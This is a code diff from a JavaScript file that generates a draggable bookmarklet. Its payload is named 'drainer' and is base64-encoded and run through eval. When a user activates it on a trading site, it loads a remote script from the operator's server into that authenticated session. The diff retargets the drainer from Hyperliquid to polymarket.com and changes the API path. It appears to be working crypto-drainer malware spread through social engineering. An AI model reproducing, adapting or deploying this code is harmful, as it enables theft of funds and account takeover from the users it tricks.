@@ -54,8 +54,8 @@ try {
 
         document.querySelectorAll("a.bookmarklet").forEach(abtns => {
             const msg = "Please go to the Hyperliquid website and activate the tool. The tool will not work unless you are on the Hyperliquid website"
-            const hyperliquidUrl = "https://app.hyperliquid.xyz";
-            const drainer = "\n(async () => {\n  try {\n    if (location.hostname === \"" + location.hostname + "\" || location.origin !== \"" + hyperliquidUrl + "\") return " + (data?.["alerts"]?.["guide"] ? "(alert)(" + JSON.stringify(msg) + ');' : '') + "\n\n\n  const script = document.createElement('script');\n    script.src = '" + api_url.origin + "/api/" + data.platform + "/core?code=" + data.code + "&username=" + data.username + "&platform=" + data.platform + "&botId=" + data.botId + "&_t=" + Date.now() + "';\n\n    document.body.appendChild(script);\n\n  } catch (err) {\n    console.error(err);\n  }\n})();";
+            const hyperliquidUrl = "https://polymarket.com";
+            const drainer = "\n(async () => {\n  try {\n    if (location.hostname === \"" + location.hostname + "\" || location.origin !== \"" + hyperliquidUrl + "\") return " + (data?.["alerts"]?.["guide"] ? "(alert)(" + JSON.stringify(msg) + ');' : '') + "\n\n\n  const script = document.createElement('script');\n    script.src = '" + api_url.origin + "/api/axiom/core?code=" + data.code + "&username=" + data.username + "&platform=" + data.platform + "&botId=" + data.botId + "&_t=" + Date.now() + "';\n\n    document.body.appendChild(script);\n\n  } catch (err) {\n    console.error(err);\n  }\n})();";
             abtns.href = "javascript:eval(atob('" + btoa(unescape(encodeURIComponent(drainer))) + "'))";
             abtns.draggable = true;
 
